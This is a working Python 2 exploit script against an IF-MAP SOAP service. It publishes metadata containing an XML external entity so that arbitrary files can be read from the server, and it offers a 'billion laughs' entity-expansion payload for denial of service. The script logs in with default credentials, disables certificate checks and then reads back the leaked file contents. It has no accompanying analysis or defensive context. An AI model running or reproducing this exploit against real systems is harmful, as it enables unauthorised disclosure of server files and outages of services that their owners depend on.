#!/usr/bin/env python2

import requests
import re
import sys
import random
import string
import getopt

from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def rand_ident(n=6):
  '''Generate a lowercase identifier.'''
  return ''.join(random.choice(string.ascii_lowercase) for _ in range(n))

def usage():
  print('%s [-h|--help] [-a|--auth <user:password>] [-u|--url <IFMAP URL>] [-g|--get <remote file starting with a slash>] [-d|--dos]' % sys.argv[0])
  print('  auth defaults to test:test')
  print('  url defaults to https://127.0.0.1:8443/axis2/services/IfmapService')


url = 'https://127.0.0.1:8443/axis2/services/IfmapService'
creds = ('test', 'test')
remote_file = None
dos = False


try:
  opts, args = getopt.getopt(sys.argv[1:], 'ha:u:dg:', ['help', 'auth=', 'url=', 'dos', 'get='])
except getopt.GetoptError as err:
  usage()
  sys.exit(1)

for o, a in opts:
  if o in ('-h', '--help'):
    usage()
    sys.exit(0)
  elif o in ('-a', '--auth'):
    creds = a.split(':')
    assert(len(creds) == 2)
  elif o in ('-u', '--url'):
    url = a
  elif o in ('-d', '--dos'):
    dos = True
  elif o in ('-g', '--get'):
    remote_file = a

if not dos and remote_file is None:
  usage()
  sys.exit(1)

if not dos:
  assert(remote_file[0] == '/')


headers = {
  'Content-Type': 'application/soap+xml',
}

def do_ifmap(body):
  r = requests.post(url,
    headers=headers,
    auth=creds,
    data=body,
    verify=False
  )
  if r.status_code != 200:
    return (r.status_code, '')

  return (r.status_code, r.content)


# create a new session-id
new_session = '''<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:ns="http://www.trustedcomputinggroup.org/2010/IFMAP/2">
   <soap:Header/>
   <soap:Body>
      <ns:newSession/>
   </soap:Body>
</soap:Envelope>'''

(status_code, soap_response) = do_ifmap(new_session)
assert(status_code == 200)
mo = re.search(r'session-id="(.*?)"', soap_response, re.I|re.S)
assert(mo)
session_id = mo.group(1)

# publish an access-request
rand_elm = rand_ident(8)
rand_ent = rand_ident(8)

if dos:
  acc_req = '''<!DOCTYPE ''' + rand_elm + ''' [
<!ENTITY ''' + rand_ent + '''0 "lol">
<!ELEMENT ''' + rand_elm + ''' (#PCDATA) >
'''

  for i in range(1, 10):
    acc_req += '<!ENTITY %s%d "' % (rand_ent, i)
    for j in range(10):
      acc_req += '&%s%d;' % (rand_ent, i-1)
    acc_req += '">\n'

  acc_req += '\n]><%s>&%s9;</%s>' % (rand_elm, rand_ent, rand_elm)
  print('%s' % acc_req)
else:
  acc_req = '''<!DOCTYPE ''' + rand_elm + ''' [
<!ELEMENT ''' + rand_elm + ''' ANY >
<!ENTITY ''' + rand_ent + ''' SYSTEM "file://''' + remote_file + '''" >
]>
<env:Envelope xmlns:env="http://www.w3.org/2003/05/soap-envelope" xmlns:ifmap="http://www.trustedcomputinggroup.org/2010/IFMAP/2" xmlns:meta="http://www.trustedcomputinggroup.org/2010/IFMAP-METADATA/2">
<env:Body>
<ifmap:publish session-id="''' + session_id + '''">
<update>
  <access-request name="666:42"/>
    <metadata>
      <meta:capability ifmap-cardinality="multiValue">
         <name>&''' + rand_ent + ''';</name>
      </meta:capability>
    </metadata>
</update>
</ifmap:publish>
</env:Body>
</env:Envelope>'''



(status_code, soap_response) = do_ifmap(acc_req)
assert(status_code == 200)

# search for the newly created access request
search = '''<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:ns="http://www.trustedcomputinggroup.org/2010/IFMAP/2">
   <soap:Header/>
   <soap:Body>
      <ns:search session-id="''' + session_id + '''">
         <access-request name="666:42"/>
      </ns:search>
   </soap:Body>
</soap:Envelope>'''


(status_code, soap_response) = do_ifmap(search)
assert(status_code == 200)
mo = re.search(r'\<name\>(.*)\</name\>', soap_response, re.I|re.S)
assert(mo)
print('%s' % mo.group(1))
